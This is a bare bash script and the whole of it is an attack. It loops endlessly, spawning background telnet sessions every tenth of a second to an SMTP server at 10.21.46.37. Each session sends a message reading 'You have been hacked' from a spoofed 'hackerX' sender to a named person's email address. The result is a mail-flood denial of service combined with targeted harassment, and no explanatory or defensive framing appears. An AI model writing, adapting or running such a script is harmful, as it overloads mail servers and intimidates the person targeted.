while true; do
{ echo "HELO DAN"; sleep 1;
  echo "MAIL FROM: hackerX@e-mail.lt"; sleep 1;
  echo "RCPT TO: elexey.prokopuk@e-mail.lt"; sleep 1;
  echo "DATA"; sleep 1;
  echo ""; sleep 1;
  echo "You have been hacked"; sleep 1;
  echo "."; sleep 1;
  echo "QUIT"; sleep 1; } | telnet 10.21.46.37 25 &

sleep 0.1
done
